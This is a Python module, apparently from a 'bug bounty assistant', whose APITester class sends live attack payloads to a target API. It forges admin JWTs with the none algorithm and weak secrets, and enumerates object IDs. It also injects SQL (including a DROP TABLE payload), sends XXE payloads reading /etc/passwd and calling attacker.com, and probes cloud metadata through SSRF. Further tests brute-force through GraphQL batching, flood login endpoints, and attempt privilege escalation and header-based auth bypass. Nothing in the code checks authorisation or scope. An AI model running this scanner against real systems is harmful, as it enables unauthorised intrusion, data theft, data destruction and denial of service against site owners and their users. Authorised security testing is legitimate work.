#!/usr/bin/env python3
"""
Advanced API Testing Module for Bug Bounty Assistant
Specialized testing for REST, GraphQL, and other API vulnerabilities
"""

import requests
import json
import time
import jwt
import base64
import hashlib
import hmac
from typing import Dict, List, Optional, Tuple
import re
from urllib.parse import urlparse, parse_qs, urlencode
import logging
from datetime import datetime, timedelta
import yaml
import xmltodict
from graphql import build_schema, validate
import asyncio
import aiohttp

logger = logging.getLogger(__name__)

class APITester:
    """Advanced API vulnerability testing"""
    
    def __init__(self, config: Dict = None):
        self.config = config or {}
        self.session = requests.Session()
        self.discovered_endpoints = []
        self.api_schemas = {}
        self.auth_mechanisms = {}
        
    def detect_api_type(self, base_url: str) -> Dict:
        """Detect API type and characteristics"""
        api_info = {
            'type': 'unknown',
            'version': None,
            'auth_type': None,
            'documentation_url': None,
            'endpoints_discovered': 0,
            'characteristics': []
        }
        
        # Check common API documentation endpoints
        doc_endpoints = [
            '/swagger.json', '/swagger.yaml', '/openapi.json', '/api-docs',
            '/v1/swagger.json', '/v2/swagger.json', '/v3/swagger.json',
            '/api/swagger.json', '/.well-known/openapi.json',
            '/graphql', '/graphql/schema', '/_graphql',
            '/api', '/api/v1', '/api/v2', '/api/v3',
            '/rest', '/rest/v1', '/rest/v2',
            '/__schema', '/introspection'
        ]
        
        for endpoint in doc_endpoints:
            try:
                url = f"{base_url}{endpoint}"
                response = self.session.get(url, timeout=10, verify=False)
                
                if response.status_code == 200:
                    content_type = response.headers.get('content-type', '').lower()
                    
                    # OpenAPI/Swagger detection
                    if 'swagger' in endpoint or 'openapi' in endpoint:
                        try:
                            spec = response.json()
                            api_info['type'] = 'openapi'
                            api_info['version'] = spec.get('openapi', spec.get('swagger', '2.0'))
                            api_info['documentation_url'] = url
                            self._parse_openapi_spec(spec)
                            break
                        except:
                            pass
                    
                    # GraphQL detection
                    elif 'graphql' in endpoint:
                        api_info['type'] = 'graphql'
                        api_info['documentation_url'] = url
                        if 'schema' in endpoint or '__schema' in endpoint:
                            self._parse_graphql_schema(response.text)
                        break
                    
                    # Generic API detection
                    elif 'json' in content_type:
                        api_info['type'] = 'rest'
                        api_info['documentation_url'] = url
                        
            except Exception as e:
                logger.debug(f"Failed to check {url}: {e}")
                continue
        
        # Detect authentication type
        api_info['auth_type'] = self._detect_auth_type(base_url)
        
        # Discover endpoints through various methods
        if api_info['type'] == 'unknown':
            api_info['type'] = self._infer_api_type(base_url)
        
        api_info['endpoints_discovered'] = len(self.discovered_endpoints)
        
        return api_info
    
    def _detect_auth_type(self, base_url: str) -> str:
        """Detect authentication mechanism"""
        test_endpoint = f"{base_url}/api/v1/user"  # Common authenticated endpoint
        
        # Test without auth
        response = self.session.get(test_endpoint, timeout=5, verify=False)
        
        # Check response headers and status
        if response.status_code == 401:
            # Check WWW-Authenticate header
            auth_header = response.headers.get('WWW-Authenticate', '').lower()
            
            if 'bearer' in auth_header:
                return 'bearer_token'
            elif 'basic' in auth_header:
                return 'basic_auth'
            elif 'digest' in auth_header:
                return 'digest_auth'
            elif 'oauth' in auth_header:
                return 'oauth'
        
        # Check for API key in different locations
        if response.status_code in [401, 403]:
            error_msg = response.text.lower()
            if 'api key' in error_msg or 'apikey' in error_msg:
                return 'api_key'
            elif 'token' in error_msg:
                return 'token'
            elif 'jwt' in error_msg:
                return 'jwt'
        
        return 'unknown'
    
    def test_authentication_vulnerabilities(self, base_url: str, auth_type: str) -> List[Dict]:
        """Test for authentication vulnerabilities"""
        findings = []
        
        if auth_type == 'jwt':
            findings.extend(self._test_jwt_vulnerabilities(base_url))
        elif auth_type == 'api_key':
            findings.extend(self._test_api_key_vulnerabilities(base_url))
        elif auth_type == 'bearer_token':
            findings.extend(self._test_bearer_token_vulnerabilities(base_url))
        
        # Generic auth tests
        findings.extend(self._test_auth_bypass(base_url))
        findings.extend(self._test_privilege_escalation(base_url))
        
        return findings
    
    def _test_jwt_vulnerabilities(self, base_url: str) -> List[Dict]:
        """Test JWT-specific vulnerabilities"""
        findings = []
        
        # Test JWT manipulation vulnerabilities
        test_tokens = [
            # Algorithm confusion
            self._create_jwt_none_algorithm(),
            # Weak secret
            self._create_jwt_weak_secret('secret'),
            self._create_jwt_weak_secret('password'),
            self._create_jwt_weak_secret('123456'),
            # Key confusion
            self._create_jwt_key_confusion(),
            # Expired token acceptance
            self._create_expired_jwt(),
            # Missing claims
            self._create_jwt_missing_claims()
        ]
        
        for token_data in test_tokens:
            if not token_data:
                continue
                
            token = token_data['token']
            vuln_type = token_data['type']
            
            # Test token on common endpoints
            test_endpoints = [
                '/api/user', '/api/profile', '/api/account',
                '/api/v1/user', '/api/v1/me', '/api/v1/profile'
            ]
            
            for endpoint in test_endpoints:
                url = f"{base_url}{endpoint}"
                
                try:
                    response = self.session.get(
                        url,
                        headers={'Authorization': f'Bearer {token}'},
                        timeout=10,
                        verify=False
                    )
                    
                    if response.status_code in [200, 201]:
                        findings.append({
                            'vulnerable': True,
                            'type': f'JWT Vulnerability - {vuln_type}',
                            'url': url,
                            'severity': 'high' if 'none' in vuln_type.lower() else 'medium',
                            'evidence': f'Accepted manipulated JWT: {token[:50]}...',
                            'payload': token,
                            'description': f'The API accepted a JWT with {vuln_type}'
                        })
                        break
                        
                except Exception as e:
                    logger.debug(f"JWT test failed: {e}")
        
        return findings
    
    def _create_jwt_none_algorithm(self) -> Optional[Dict]:
        """Create JWT with 'none' algorithm"""
        try:
            header = {"alg": "none", "typ": "JWT"}
            payload = {
                "sub": "1234567890",
                "name": "Test User",
                "iat": int(time.time()),
                "exp": int(time.time()) + 3600,
                "admin": True
            }
            
            header_encoded = base64.urlsafe_b64encode(
                json.dumps(header).encode()
            ).decode().rstrip('=')
            
            payload_encoded = base64.urlsafe_b64encode(
                json.dumps(payload).encode()
            ).decode().rstrip('=')
            
            token = f"{header_encoded}.{payload_encoded}."
            
            return {
                'token': token,
                'type': 'None Algorithm'
            }
        except:
            return None
    
    def _create_jwt_weak_secret(self, secret: str) -> Optional[Dict]:
        """Create JWT with weak secret"""
        try:
            payload = {
                "sub": "1234567890",
                "name": "Test User",
                "iat": int(time.time()),
                "exp": int(time.time()) + 3600,
                "admin": True
            }
            
            token = jwt.encode(payload, secret, algorithm='HS256')
            
            return {
                'token': token,
                'type': f'Weak Secret ({secret})'
            }
        except:
            return None
    
    def _create_jwt_key_confusion(self) -> Optional[Dict]:
        """Create JWT for key confusion attack"""
        # This would implement RS256 to HS256 confusion
        # Simplified for example
        return None
    
    def _create_expired_jwt(self) -> Optional[Dict]:
        """Create expired JWT"""
        try:
            payload = {
                "sub": "1234567890",
                "name": "Test User",
                "iat": int(time.time()) - 7200,
                "exp": int(time.time()) - 3600,  # Expired 1 hour ago
                "admin": True
            }
            
            token = jwt.encode(payload, 'secret', algorithm='HS256')
            
            return {
                'token': token,
                'type': 'Expired Token'
            }
        except:
            return None
    
    def _create_jwt_missing_claims(self) -> Optional[Dict]:
        """Create JWT with missing required claims"""
        try:
            payload = {
                "name": "Test User"
                # Missing sub, iat, exp
            }
            
            token = jwt.encode(payload, 'secret', algorithm='HS256')
            
            return {
                'token': token,
                'type': 'Missing Required Claims'
            }
        except:
            return None
    
    def test_api_endpoints(self, base_url: str, endpoints: List[str] = None) -> List[Dict]:
        """Test discovered API endpoints for vulnerabilities"""
        findings = []
        
        if not endpoints:
            endpoints = self.discovered_endpoints
        
        for endpoint in endpoints:
            # IDOR testing
            findings.extend(self._test_idor(base_url, endpoint))
            
            # SQL injection in API parameters
            findings.extend(self._test_api_sqli(base_url, endpoint))
            
            # XXE in API
            findings.extend(self._test_api_xxe(base_url, endpoint))
            
            # SSRF in API
            findings.extend(self._test_api_ssrf(base_url, endpoint))
            
            # Mass assignment
            findings.extend(self._test_mass_assignment(base_url, endpoint))
            
            # Rate limiting
            findings.extend(self._test_rate_limiting(base_url, endpoint))
            
            # Method override
            findings.extend(self._test_method_override(base_url, endpoint))
        
        return findings
    
    def _test_idor(self, base_url: str, endpoint: str) -> List[Dict]:
        """Test for Insecure Direct Object Reference"""
        findings = []
        
        # Extract ID patterns from endpoint
        id_patterns = [
            r'/(\d+)',  # Numeric ID
            r'/([a-f0-9]{24})',  # MongoDB ObjectId
            r'/([a-f0-9]{8}-[a-f0-9]{4}-[a-f0-9]{4}-[a-f0-9]{4}-[a-f0-9]{12})',  # UUID
            r'/([a-zA-Z0-9]+)$'  # Alphanumeric ID
        ]
        
        for pattern in id_patterns:
            match = re.search(pattern, endpoint)
            if match:
                original_id = match.group(1)
                
                # Generate test IDs
                test_ids = self._generate_idor_test_ids(original_id)
                
                for test_id in test_ids:
                    test_endpoint = endpoint.replace(original_id, test_id)
                    url = f"{base_url}{test_endpoint}"
                    
                    try:
                        # Test with and without auth
                        for auth in [None, {'Authorization': 'Bearer fake_token'}]:
                            response = self.session.get(
                                url,
                                headers=auth,
                                timeout=10,
                                verify=False
                            )
                            
                            if response.status_code == 200:
                                findings.append({
                                    'vulnerable': True,
                                    'type': 'Insecure Direct Object Reference (IDOR)',
                                    'url': url,
                                    'severity': 'high',
                                    'evidence': f'Accessed object with ID: {test_id}',
                                    'original_id': original_id,
                                    'accessed_id': test_id,
                                    'auth_used': bool(auth)
                                })
                                break
                                
                    except Exception as e:
                        logger.debug(f"IDOR test failed: {e}")
        
        return findings
    
    def _generate_idor_test_ids(self, original_id: str) -> List[str]:
        """Generate IDOR test IDs based on original"""
        test_ids = []
        
        # Numeric IDs
        if original_id.isdigit():
            num_id = int(original_id)
            test_ids.extend([
                str(num_id - 1),
                str(num_id + 1),
                '1', '0', '999999'
            ])
        
        # UUID-like IDs
        elif '-' in original_id and len(original_id) == 36:
            test_ids.extend([
                '00000000-0000-0000-0000-000000000000',
                '11111111-1111-1111-1111-111111111111',
                original_id[:-1] + ('0' if original_id[-1] != '0' else '1')
            ])
        
        # MongoDB ObjectId-like
        elif len(original_id) == 24 and all(c in '0123456789abcdef' for c in original_id):
            test_ids.extend([
                '000000000000000000000000',
                '111111111111111111111111',
                original_id[:-1] + ('0' if original_id[-1] != '0' else '1')
            ])
        
        # Generic string IDs
        else:
            if original_id.startswith('user'):
                test_ids.extend(['user1', 'user2', 'admin', 'root'])
            else:
                test_ids.extend(['test', 'admin', '1', 'null'])
        
        return test_ids
    
    def _test_api_sqli(self, base_url: str, endpoint: str) -> List[Dict]:
        """Test for SQL injection in API parameters"""
        findings = []
        
        sqli_payloads = [
            "' OR '1'='1",
            "' OR '1'='1' --",
            "' OR '1'='1' /*",
            "1' OR '1'='1",
            "1 OR 1=1",
            "' UNION SELECT NULL--",
            "' AND SLEEP(5)--",
            "'; DROP TABLE users--",
            "' AND 1=CONVERT(int, (SELECT @@version))--"
        ]
        
        # Test GET parameters
        if '?' in endpoint:
            base_endpoint, params_str = endpoint.split('?', 1)
            params = parse_qs(params_str)
            
            for param_name, param_values in params.items():
                for payload in sqli_payloads:
                    test_params = params.copy()
                    test_params[param_name] = [payload]
                    
                    test_url = f"{base_url}{base_endpoint}?{urlencode(test_params, doseq=True)}"
                    
                    try:
                        response = self.session.get(test_url, timeout=10, verify=False)
                        
                        # Check for SQL error messages
                        error_patterns = [
                            r'sql syntax',
                            r'mysql_fetch',
                            r'ORA-\d+',
                            r'PostgreSQL.*ERROR',
                            r'warning.*\Wmysql_',
                            r'valid MySQL result',
                            r'mssql_query\(\)',
                            r'SQLException',
                            r'Syntax error.*SQL'
                        ]
                        
                        for pattern in error_patterns:
                            if re.search(pattern, response.text, re.IGNORECASE):
                                findings.append({
                                    'vulnerable': True,
                                    'type': 'SQL Injection',
                                    'url': test_url,
                                    'parameter': param_name,
                                    'payload': payload,
                                    'severity': 'critical',
                                    'evidence': f'SQL error in response: {pattern}'
                                })
                                break
                                
                    except Exception as e:
                        logger.debug(f"SQLi test failed: {e}")
        
        return findings
    
    def _test_api_xxe(self, base_url: str, endpoint: str) -> List[Dict]:
        """Test for XXE in API endpoints that accept XML"""
        findings = []
        
        # XXE payloads
        xxe_payloads = [
            # External entity
            '''<?xml version="1.0" encoding="UTF-8"?>
            <!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
            <root>&xxe;</root>''',
            
            # Parameter entity
            '''<?xml version="1.0" encoding="UTF-8"?>
            <!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://attacker.com/xxe">%xxe;]>
            <root>test</root>''',
            
            # Billion laughs
            '''<?xml version="1.0"?>
            <!DOCTYPE lolz [
              <!ENTITY lol "lol">
              <!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
            ]>
            <lolz>&lol2;</lolz>'''
        ]
        
        url = f"{base_url}{endpoint}"
        
        for payload in xxe_payloads:
            try:
                response = self.session.post(
                    url,
                    data=payload,
                    headers={'Content-Type': 'application/xml'},
                    timeout=10,
                    verify=False
                )
                
                # Check for XXE indicators
                if any(indicator in response.text for indicator in ['root:x:', 'daemon:', '/etc/passwd']):
                    findings.append({
                        'vulnerable': True,
                        'type': 'XML External Entity (XXE)',
                        'url': url,
                        'severity': 'critical',
                        'payload': payload[:100] + '...',
                        'evidence': 'System file contents in response'
                    })
                    break
                    
            except Exception as e:
                logger.debug(f"XXE test failed: {e}")
        
        return findings
    
    def _test_api_ssrf(self, base_url: str, endpoint: str) -> List[Dict]:
        """Test for SSRF in API parameters"""
        findings = []
        
        # SSRF test payloads
        ssrf_payloads = [
            'http://127.0.0.1:22',
            'http://localhost:22',
            'http://[::1]:22',
            'http://0.0.0.0:22',
            'http://169.254.169.254/latest/meta-data/',  # AWS metadata
            'http://metadata.google.internal/',  # GCP metadata
            'http://169.254.169.254/metadata/v1/',  # Azure metadata
            'file:///etc/passwd',
            'gopher://127.0.0.1:3306/_',
            'dict://127.0.0.1:6379/INFO'
        ]
        
        # Find URL parameters
        url_params = ['url', 'uri', 'path', 'dest', 'redirect', 'out', 'view', 
                     'site', 'from', 'to', 'ref', 'source', 'src', 'href',
                     'image', 'img', 'link', 'fetch', 'proxy', 'webhook']
        
        for param in url_params:
            for payload in ssrf_payloads:
                test_url = f"{base_url}{endpoint}"
                
                # Test GET
                if '?' in test_url:
                    test_url += f"&{param}={payload}"
                else:
                    test_url += f"?{param}={payload}"
                
                try:
                    response = self.session.get(test_url, timeout=10, verify=False)
                    
                    # Check for SSRF indicators
                    if self._check_ssrf_indicators(response, payload):
                        findings.append({
                            'vulnerable': True,
                            'type': 'Server-Side Request Forgery (SSRF)',
                            'url': test_url,
                            'parameter': param,
                            'payload': payload,
                            'severity': 'high',
                            'evidence': 'Internal service response detected'
                        })
                        break
                        
                except Exception as e:
                    logger.debug(f"SSRF test failed: {e}")
        
        return findings
    
    def _check_ssrf_indicators(self, response: requests.Response, payload: str) -> bool:
        """Check response for SSRF indicators"""
        indicators = [
            'SSH-', 'OpenSSH',  # SSH service
            'root:x:', 'daemon:',  # /etc/passwd
            'ami-id', 'instance-id',  # AWS metadata
            'computeMetadata',  # GCP metadata
            'mysql_native_password',  # MySQL
            'redis_version',  # Redis
            '550 5.7.1'  # SMTP
        ]
        
        response_text = response.text.lower()
        
        for indicator in indicators:
            if indicator.lower() in response_text:
                return True
        
        # Check for timing differences (potential blind SSRF)
        if response.elapsed.total_seconds() > 5 and 'timeout' not in response_text:
            return True
        
        return False
    
    def test_graphql_vulnerabilities(self, graphql_url: str) -> List[Dict]:
        """Test GraphQL-specific vulnerabilities"""
        findings = []
        
        # Introspection query
        introspection_query = '''
        query IntrospectionQuery {
          __schema {
            types {
              name
              fields {
                name
                args {
                  name
                  type {
                    name
                  }
                }
              }
            }
          }
        }
        '''
        
        try:
            response = self.session.post(
                graphql_url,
                json={'query': introspection_query},
                timeout=10,
                verify=False
            )
            
            if response.status_code == 200 and '__schema' in response.text:
                findings.append({
                    'vulnerable': True,
                    'type': 'GraphQL Introspection Enabled',
                    'url': graphql_url,
                    'severity': 'medium',
                    'evidence': 'Full schema exposed via introspection',
                    'schema': response.json()
                })
                
                # Parse schema for further testing
                schema_data = response.json()
                self._parse_graphql_schema_from_introspection(schema_data)
        except:
            pass
        
        # Test for query depth limit
        findings.extend(self._test_graphql_depth_limit(graphql_url))
        
        # Test for batching attacks
        findings.extend(self._test_graphql_batching(graphql_url))
        
        # Test for field suggestions
        findings.extend(self._test_graphql_field_suggestions(graphql_url))
        
        # Test for injection
        findings.extend(self._test_graphql_injection(graphql_url))
        
        return findings
    
    def _test_graphql_depth_limit(self, graphql_url: str) -> List[Dict]:
        """Test GraphQL query depth limit"""
        findings = []
        
        # Create deeply nested query
        deep_query = 'query { user { posts { comments { user { posts { comments { user { posts { comments { text } } } } } } } } } }'
        
        try:
            response = self.session.post(
                graphql_url,
                json={'query': deep_query},
                timeout=10,
                verify=False
            )
            
            if response.status_code == 200 and 'errors' not in response.text:
                findings.append({
                    'vulnerable': True,
                    'type': 'GraphQL Query Depth Limit Bypass',
                    'url': graphql_url,
                    'severity': 'medium',
                    'evidence': 'No query depth limit - DoS possible',
                    'payload': deep_query
                })
        except:
            pass
        
        return findings
    
    def _test_graphql_batching(self, graphql_url: str) -> List[Dict]:
        """Test GraphQL batching attacks"""
        findings = []
        
        # Batch query for brute force
        batch_queries = []
        for i in range(100):
            batch_queries.append({
                'query': f'query {{ user(id: {i}) {{ id email }} }}'
            })
        
        try:
            response = self.session.post(
                graphql_url,
                json=batch_queries,
                timeout=10,
                verify=False
            )
            
            if response.status_code == 200 and isinstance(response.json(), list):
                findings.append({
                    'vulnerable': True,
                    'type': 'GraphQL Batching Attack',
                    'url': graphql_url,
                    'severity': 'medium',
                    'evidence': 'Batching enabled - allows brute force attacks',
                    'batch_size_tested': len(batch_queries)
                })
        except:
            pass
        
        return findings
    
    def _test_graphql_field_suggestions(self, graphql_url: str) -> List[Dict]:
        """Test GraphQL field suggestions for information disclosure"""
        findings = []
        
        # Query with typo to trigger suggestions
        query = '{ user { passwrd } }'  # Typo in 'password'
        
        try:
            response = self.session.post(
                graphql_url,
                json={'query': query},
                timeout=10,
                verify=False
            )
            
            if response.status_code == 200:
                response_data = response.json()
                if 'errors' in response_data:
                    error_msg = str(response_data['errors'])
                    
                    # Check for field suggestions
                    if 'Did you mean' in error_msg or 'password' in error_msg:
                        findings.append({
                            'vulnerable': True,
                            'type': 'GraphQL Field Suggestion Information Disclosure',
                            'url': graphql_url,
                            'severity': 'low',
                            'evidence': 'Field suggestions reveal schema information',
                            'disclosed_field': 'password'
                        })
        except:
            pass
        
        return findings
    
    def _test_graphql_injection(self, graphql_url: str) -> List[Dict]:
        """Test for injection vulnerabilities in GraphQL"""
        findings = []
        
        # SQL injection in GraphQL
        injection_queries = [
            '{ user(id: "1\' OR \'1\'=\'1") { id } }',
            '{ user(name: "admin\' --") { id } }',
            '{ search(q: "\' UNION SELECT * FROM users--") { results } }'
        ]
        
        for query in injection_queries:
            try:
                response = self.session.post(
                    graphql_url,
                    json={'query': query},
                    timeout=10,
                    verify=False
                )
                
                # Check for SQL errors
                if any(err in response.text.lower() for err in ['sql', 'syntax', 'mysql', 'postgres']):
                    findings.append({
                        'vulnerable': True,
                        'type': 'GraphQL SQL Injection',
                        'url': graphql_url,
                        'severity': 'critical',
                        'payload': query,
                        'evidence': 'SQL error in response'
                    })
                    break
                    
            except:
                pass
        
        return findings
    
    def _parse_openapi_spec(self, spec: Dict):
        """Parse OpenAPI/Swagger specification"""
        paths = spec.get('paths', {})
        
        for path, methods in paths.items():
            for method, details in methods.items():
                if method.lower() in ['get', 'post', 'put', 'delete', 'patch']:
                    endpoint = {
                        'path': path,
                        'method': method.upper(),
                        'parameters': details.get('parameters', []),
                        'security': details.get('security', []),
                        'summary': details.get('summary', '')
                    }
                    self.discovered_endpoints.append(endpoint)
        
        # Store security schemes
        self.api_schemas['security'] = spec.get('components', {}).get('securitySchemes', {})
    
    def _parse_graphql_schema(self, schema_text: str):
        """Parse GraphQL schema"""
        try:
            schema = build_schema(schema_text)
            self.api_schemas['graphql'] = schema
            
            # Extract queries and mutations
            query_type = schema.query_type
            if query_type:
                for field_name, field in query_type.fields.items():
                    self.discovered_endpoints.append({
                        'type': 'query',
                        'name': field_name,
                        'args': [arg.name for arg in field.args]
                    })
            
            mutation_type = schema.mutation_type
            if mutation_type:
                for field_name, field in mutation_type.fields.items():
                    self.discovered_endpoints.append({
                        'type': 'mutation',
                        'name': field_name,
                        'args': [arg.name for arg in field.args]
                    })
                    
        except Exception as e:
            logger.error(f"Failed to parse GraphQL schema: {e}")
    
    def _parse_graphql_schema_from_introspection(self, introspection_data: Dict):
        """Parse GraphQL schema from introspection result"""
        try:
            types = introspection_data.get('data', {}).get('__schema', {}).get('types', [])
            
            for type_info in types:
                if type_info['name'] in ['Query', 'Mutation']:
                    fields = type_info.get('fields', [])
                    for field in fields:
                        self.discovered_endpoints.append({
                            'type': type_info['name'].lower(),
                            'name': field['name'],
                            'args': [arg['name'] for arg in field.get('args', [])]
                        })
                        
        except Exception as e:
            logger.error(f"Failed to parse introspection data: {e}")
    
    def _infer_api_type(self, base_url: str) -> str:
        """Infer API type from responses"""
        test_endpoints = ['/api', '/api/v1', '/graphql', '/rest']
        
        for endpoint in test_endpoints:
            try:
                response = self.session.get(f"{base_url}{endpoint}", timeout=5, verify=False)
                content_type = response.headers.get('content-type', '').lower()
                
                if 'graphql' in endpoint and response.status_code < 500:
                    return 'graphql'
                elif 'json' in content_type:
                    return 'rest'
                elif 'xml' in content_type:
                    return 'soap'
                    
            except:
                continue
        
        return 'rest'  # Default to REST
    
    def _test_mass_assignment(self, base_url: str, endpoint: str) -> List[Dict]:
        """Test for mass assignment vulnerabilities"""
        findings = []
        
        # Common sensitive fields
        sensitive_fields = {
            'role': 'admin',
            'admin': True,
            'is_admin': True,
            'is_staff': True,
            'verified': True,
            'email_verified': True,
            'permissions': ['admin', 'write', 'delete'],
            'groups': ['admin', 'superuser'],
            'balance': 999999,
            'credits': 999999,
            'discount': 100,
            'price': 0
        }
        
        # Try to update user object with extra fields
        if any(pattern in endpoint for pattern in ['/user', '/profile', '/account', '/settings']):
            url = f"{base_url}{endpoint}"
            
            for field, value in sensitive_fields.items():
                try:
                    # Try PUT/PATCH with extra field
                    for method in ['PUT', 'PATCH']:
                        payload = {
                            'name': 'Test User',  # Normal field
                            field: value  # Potentially sensitive field
                        }
                        
                        response = self.session.request(
                            method,
                            url,
                            json=payload,
                            timeout=10,
                            verify=False
                        )
                        
                        if response.status_code in [200, 201, 204]:
                            # Check if field was accepted
                            if field in response.text:
                                findings.append({
                                    'vulnerable': True,
                                    'type': 'Mass Assignment',
                                    'url': url,
                                    'method': method,
                                    'field': field,
                                    'severity': 'high' if field in ['role', 'admin', 'is_admin'] else 'medium',
                                    'evidence': f'Accepted sensitive field: {field}',
                                    'payload': payload
                                })
                                
                except Exception as e:
                    logger.debug(f"Mass assignment test failed: {e}")
        
        return findings
    
    def _test_rate_limiting(self, base_url: str, endpoint: str) -> List[Dict]:
        """Test for missing rate limiting"""
        findings = []
        url = f"{base_url}{endpoint}"
        
        # Endpoints that should have rate limiting
        sensitive_endpoints = ['/login', '/auth', '/password', '/reset', '/verify',
                             '/api/auth', '/api/login', '/2fa', '/otp']
        
        if any(pattern in endpoint for pattern in sensitive_endpoints):
            try:
                # Send rapid requests
                responses = []
                start_time = time.time()
                
                for i in range(50):  # 50 requests rapidly
                    response = self.session.post(
                        url,
                        json={'username': f'test{i}', 'password': 'password'},
                        timeout=5,
                        verify=False
                    )
                    responses.append(response.status_code)
                
                end_time = time.time()
                duration = end_time - start_time
                
                # Check if rate limiting kicked in
                rate_limit_codes = [429, 503]
                if not any(code in responses for code in rate_limit_codes):
                    findings.append({
                        'vulnerable': True,
                        'type': 'Missing Rate Limiting',
                        'url': url,
                        'severity': 'medium',
                        'requests_sent': len(responses),
                        'duration_seconds': duration,
                        'requests_per_second': len(responses) / duration,
                        'evidence': 'No rate limiting detected on sensitive endpoint'
                    })
                    
            except Exception as e:
                logger.debug(f"Rate limit test failed: {e}")
        
        return findings
    
    def _test_method_override(self, base_url: str, endpoint: str) -> List[Dict]:
        """Test for HTTP method override vulnerabilities"""
        findings = []
        url = f"{base_url}{endpoint}"
        
        # Method override headers
        override_headers = [
            'X-HTTP-Method-Override',
            'X-HTTP-Method',
            'X-Method-Override',
            '_method'
        ]
        
        # Try to override GET with dangerous methods
        dangerous_methods = ['PUT', 'DELETE', 'PATCH']
        
        for header in override_headers:
            for method in dangerous_methods:
                try:
                    # Send GET request with override header
                    response = self.session.get(
                        url,
                        headers={header: method},
                        timeout=10,
                        verify=False
                    )
                    
                    # Check if method was overridden
                    if response.status_code in [200, 201, 204]:
                        # Try to confirm by checking side effects
                        findings.append({
                            'vulnerable': True,
                            'type': 'HTTP Method Override',
                            'url': url,
                            'header': header,
                            'method_override': method,
                            'severity': 'medium',
                            'evidence': f'Method override accepted: GET -> {method}'
                        })
                        break
                        
                except Exception as e:
                    logger.debug(f"Method override test failed: {e}")
        
        return findings
    
    def _test_auth_bypass(self, base_url: str) -> List[Dict]:
        """Test for authentication bypass vulnerabilities"""
        findings = []
        
        # Common auth bypass techniques
        bypass_headers = [
            {'X-Forwarded-For': '127.0.0.1'},
            {'X-Originating-IP': '127.0.0.1'},
            {'X-Remote-IP': '127.0.0.1'},
            {'X-Client-IP': '127.0.0.1'},
            {'X-Real-IP': '127.0.0.1'},
            {'X-Forwarded-Host': 'localhost'},
            {'X-Original-URL': '/admin'},
            {'X-Rewrite-URL': '/admin'},
            {'X-Custom-IP-Authorization': '127.0.0.1'},
            {'X-Backend-User': 'admin'}
        ]
        
        # Protected endpoints to test
        protected_endpoints = [
            '/admin', '/api/admin', '/management', '/internal',
            '/api/v1/admin', '/api/v1/users', '/api/v1/config'
        ]
        
        for endpoint in protected_endpoints:
            url = f"{base_url}{endpoint}"
            
            # First check if endpoint requires auth
            try:
                response = self.session.get(url, timeout=5, verify=False)
                if response.status_code not in [401, 403]:
                    continue  # Not protected
            except:
                continue
            
            # Try bypass techniques
            for headers in bypass_headers:
                try:
                    response = self.session.get(
                        url,
                        headers=headers,
                        timeout=10,
                        verify=False
                    )
                    
                    if response.status_code == 200:
                        findings.append({
                            'vulnerable': True,
                            'type': 'Authentication Bypass',
                            'url': url,
                            'severity': 'critical',
                            'bypass_headers': headers,
                            'evidence': 'Accessed protected endpoint without authentication'
                        })
                        break
                        
                except Exception as e:
                    logger.debug(f"Auth bypass test failed: {e}")
        
        return findings
    
    def _test_privilege_escalation(self, base_url: str) -> List[Dict]:
        """Test for privilege escalation vulnerabilities"""
        findings = []
        
        # This would require authenticated testing with low-privilege account
        # Simplified example
        escalation_payloads = [
            {'role': 'admin'},
            {'is_admin': True},
            {'user_type': 'administrator'},
            {'privileges': ['admin', 'super_user']}
        ]
        
        user_endpoints = ['/api/user', '/api/profile', '/api/me', '/api/account']
        
        for endpoint in user_endpoints:
            url = f"{base_url}{endpoint}"
            
            for payload in escalation_payloads:
                try:
                    # Try to update user with elevated privileges
                    response = self.session.patch(
                        url,
                        json=payload,
                        timeout=10,
                        verify=False
                    )
                    
                    if response.status_code in [200, 201] and any(key in response.text for key in payload.keys()):
                        findings.append({
                            'vulnerable': True,
                            'type': 'Privilege Escalation',
                            'url': url,
                            'severity': 'critical',
                            'payload': payload,
                            'evidence': 'Successfully modified user privileges'
                        })
                        
                except Exception as e:
                    logger.debug(f"Privilege escalation test failed: {e}")
        
        return findings
